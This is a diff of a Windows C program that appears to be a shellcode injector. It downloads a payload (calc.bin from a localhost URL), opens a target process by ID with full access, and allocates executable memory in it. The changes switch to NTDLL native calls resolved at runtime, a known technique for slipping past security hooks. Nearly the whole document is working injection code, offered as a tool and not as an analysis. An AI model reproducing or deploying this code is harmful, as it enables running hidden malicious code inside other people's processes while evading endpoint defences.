@@ -2,10 +2,24 @@
 #include <wininet.h>
 #include <stdio.h>
 #include "debug.h"
+#include "native.h"
 
-const char* s = "[+]";
-const char* f = "[-]";
-const char* w = "[*]";
+
+HMODULE GetMod(IN LPCWSTR modName) {
+	HMODULE hModule = NULL;
+
+	LOG_INFO("trying to open a handle to %S", modName);
+	hModule = GetModuleHandleW(modName);
+
+	if (hModule == NULL) {
+		LOG_ERROR("failed to open a handle to the specified module, Error: 0x%lx", GetLastError());
+		return 0;
+	}
+	else {
+		LOG_SUCCESS("opened a handle to the specified module!");
+		return hModule;
+	}
+}
 
 
 int main(int argc, char* argv[]) {
@@ -16,13 +30,16 @@ int main(int argc, char* argv[]) {
 	LPCWSTR sourceURL = L"http://127.0.0.1:8000/calc.bin";
 	PBYTE pBytes = NULL;
 	PBYTE pTmpBytes = NULL;
+	PVOID hTmpHeap = NULL;
+	PBYTE hHeap = NULL;
 	SIZE_T sSize = NULL;
 	LPVOID rBuffer = NULL;
 	HINTERNET hInet, hURL = NULL;
+	HMODULE hNTDLL = NULL;
+	NTSTATUS STATUS = NULL;
 
 	PBYTE* pPayloadBytes = NULL;
 	SIZE_T* sPayloadBytes = NULL;
-
 
 	if (argc < 2) {
 		LOG_ERROR("Not enough arguments!");
@@ -30,26 +47,39 @@ int main(int argc, char* argv[]) {
 		return 1;
 	}
 
+	hNTDLL = GetMod(L"NTDLL"); //open a handle to NTDLL
 	PID = atoi(argv[1]);
 	LOG_INFO("attempting to open a handle to the provided process (%ld)", PID);
 
+	LOG_INFO("populating function prototypes");
+	NtOpenProcess meowOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
+	NtCreateThreadEx meowThreadOpen = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
+	NtClose meowClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
+	RtlCreateHeap meowCreateHeap = (RtlCreateHeap)GetProcAddress(hNTDLL, "RtlCreateHeap");
+	RtlAllocateHeap meowAllocateHeap = (RtlAllocateHeap)GetProcAddress(hNTDLL, "RtlAllocateHeap");
+	RtlFreeHeap meowFreeHeap = (RtlFreeHeap)GetProcAddress(hNTDLL, "RtlFreeHeap");
+	RtlDestroyHeap meowDestroyHeap = (RtlDestroyHeap)GetProcAddress(hNTDLL, "RtlDestroyHeap");
+	LOG_SUCCESS("finished populating function prototypes");
+
+	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
+	CLIENT_ID CID = { (HANDLE)PID, NULL };
 
 	// open a handle to the provided process
-	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
-
-	if (hProcess == NULL) {
-		LOG_ERROR("could not open a handle to the provided process... Error: %ld", GetLastError());
+	STATUS = meowOpen(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
+	if (STATUS != STATUS_SUCCESS) {
+		LOG_ERROR("[NtOpenProcess] failed to get a handle on the specified process, Error: 0x%lx", STATUS);
 		return 1;
 	}
-
-	LOG_SUCCESS("successfully opened a handle to the provided process!\n\\---0x%p", hProcess);
+	
+	LOG_SUCCESS("opened a handle to the specified process! (%ld)", PID);
+	LOG_INFO("\\___[ hProcess\n\t\t\_0x%p]", hProcess);
 
 	// open handle to WinInet
 	hInet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
 
 	if (hInet == NULL) {
 		LOG_ERROR("could not open a handle to hInet... Error: %ld", GetLastError());
-		CloseHandle(hProcess);
+		goto CLEANUP;
 		return 1;
 	}
 
@@ -60,22 +90,41 @@ int main(int argc, char* argv[]) {
 
 	if (hURL == NULL) {
 		LOG_ERROR("could not open a handle to URL... Error: %ld", GetLastError());
-		CloseHandle(hProcess);
+		meowClose(hProcess);
 		CloseHandle(hInet);
 		return 1;
 	}
 
 	LOG_SUCCESS("successfully opened a handle to the provided URL!");
 
-	// allocate 1024 bytes to temporary buffer
-	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+	// create heap and commit it immediately
+	hTmpHeap = (PBYTE)meowCreateHeap(HEAP_GROWABLE, NULL, 1024, 2048, NULL, NULL);
+
+	if (hTmpHeap == NULL) {
+		meowClose(hProcess);
+		CloseHandle(hInet);
+		LOG_ERROR("failed to create temporary heap, Error: %ld", GetLastError());
+		return 1;
+	}
+
+	LOG_SUCCESS("successfully created temporary heap");
+	LOG_DEBUG("HeapHandle: %p", hTmpHeap);
+	LOG_DEBUG("Flags: HEAP_ZERO_MEMORY");
+	LOG_DEBUG("Size: 1024");
+	// allocate memory in the heap
+	LOG_DEBUG("TEST %ld", GetLastError());
+	pTmpBytes = (PBYTE)meowAllocateHeap(hTmpHeap, HEAP_ZERO_MEMORY, 1024);
+	LOG_DEBUG("TEST %ld", GetLastError());
+	// allocate 1024 bytes to temporary buffer (outdated)
+	// pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
 
 	if (pTmpBytes == NULL) {
-		return 1; // i am so fucking tired of error handling
-		LocalFree(pTmpBytes);
+		LOG_ERROR("failed to allocate memory in temporary heap, Error: %ld", GetLastError());
+		meowDestroyHeap(hTmpHeap);
 		InternetCloseHandle(hURL);
 		CloseHandle(hInet);
-		CloseHandle(hProcess);
+		meowClose(hProcess);
+		return 1; // i am so fucking tired of error handling
 	}
 
 	LOG_SUCCESS("successfully allocated memory to temp buffer!\n\\---0x%p", pTmpBytes);
@@ -85,10 +134,11 @@ int main(int argc, char* argv[]) {
 		// read 1024 bytes to temp buffer
 		if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
 			LOG_ERROR("could not read contents of specified file... Error: %ld", GetLastError());
-			LocalFree(pTmpBytes);
+			meowFreeHeap(hTmpHeap, NULL, pTmpBytes);
+			meowDestroyHeap(hTmpHeap);
 			InternetCloseHandle(hURL);
 			CloseHandle(hInet);
-			CloseHandle(hProcess);
+			meowClose(hProcess);
 			return 1;
 		}
 
@@ -97,19 +147,37 @@ int main(int argc, char* argv[]) {
 
 		// allocate final buffer
 		if (pBytes == NULL) {
-			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+			hHeap = (PBYTE)meowCreateHeap(HEAP_GROWABLE, NULL, dwBytesRead, dwBytesRead, NULL, NULL);
+			pBytes = (PBYTE)meowAllocateHeap(hHeap, HEAP_ZERO_MEMORY, dwBytesRead);
 		}
 		else {
 			// if it wasn't NULL, reallocate it to == sSize
-			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+			// pBytes = (PBYTE)meowAllocateHeap(hHeap, HEAP_REALLOC, sSize);
+			LOG_ERROR("pBytes is not null, what's up with that?");
+			return 1;
+		}
+
+		if (hHeap == NULL) {
+			meowFreeHeap(hHeap, NULL, pBytes);
+			meowFreeHeap(hTmpHeap, NULL, pTmpBytes);
+			meowDestroyHeap(hHeap);
+			meowDestroyHeap(hTmpHeap);
+			InternetCloseHandle(hURL);
+			CloseHandle(hInet);
+			meowClose(hProcess);
+			LOG_ERROR("failed to create final heap, Error: %ld", GetLastError());
+			return 1;
 		}
 
 		if (pBytes == NULL) {
-			LocalFree(pBytes);
-			LocalFree(pTmpBytes);
+			meowFreeHeap(hHeap, NULL, pBytes);
+			meowFreeHeap(hTmpHeap, NULL, pTmpBytes);
+			meowDestroyHeap(hHeap);
+			meowDestroyHeap(hTmpHeap);
 			InternetCloseHandle(hURL);
 			CloseHandle(hInet);
-			CloseHandle(hProcess);
+			meowClose(hProcess);
+			LOG_ERROR("failed to create final buffer, Error: %ld", GetLastError());
 			return 1; // as i said, i am sick and tired of error handling, get off my dick
 		}
 
@@ -137,20 +205,20 @@ int main(int argc, char* argv[]) {
 
 
 	// clean up
-	LOG_INFO("closing previously created inet handles and freeing memory\n");
+	LOG_INFO("closing previously created inet handles and freeing memory");
 	InternetCloseHandle(hInet);
 	InternetCloseHandle(hURL);
 	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
 	LocalFree(pTmpBytes);
 	LocalFree(pBytes);
-	LOG_SUCCESS("success\n");
+	LOG_SUCCESS("success");
 
 	// allocate bytes in the memory of the specified process
 	rBuffer = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	if (rBuffer == NULL) {
 		LOG_ERROR("could not allocate memory in host process... Error: %ld", GetLastError());
-		CloseHandle(hProcess);
+		meowClose(hProcess);
 		free(pPayloadBytes);
 		free(sPayloadBytes);
 		return 1;
@@ -172,7 +240,7 @@ int main(int argc, char* argv[]) {
 	}
 	else {
 		LOG_ERROR("could not open a handle to thread... Error: %ld", GetLastError());
-		CloseHandle(hProcess);
+		meowClose(hProcess);
 		VirtualFree(rBuffer, 0, MEM_RELEASE);
 		free(pPayloadBytes);
 		free(sPayloadBytes);
@@ -183,12 +251,34 @@ int main(int argc, char* argv[]) {
 	LOG_SUCCESS("thread finished executing, cleaning up...");
 
 	// clean up after yourself!
-	CloseHandle(hProcess);
+	meowClose(hProcess);
 	CloseHandle(hThread);
 	VirtualFree(rBuffer, 0, MEM_RELEASE);
 	free(pPayloadBytes);
 	free(sPayloadBytes);
 	LOG_SUCCESS("closed handle to process");
+
+CLEANUP:
+	/*
+	if (rBuffer) {
+		STATUS = p_NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
+		if (STATUS_SUCCESS != Status) {
+			PRINT_ERROR("NtFreeVirtualMemory", Status);
+		}
+		else {
+			INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
+		}
+	}
+	
+	if (ThreadHandle) {
+		p_NtClose(ThreadHandle);
+		INFO("[0x%p] handle on thread closed", ThreadHandle);
+	}
+	*/
+	if (hProcess) {
+		meowClose(hProcess);
+		LOG_INFO("[0x%p] handle on process closed", hProcess);
+	}
 
 	return 0;
 }
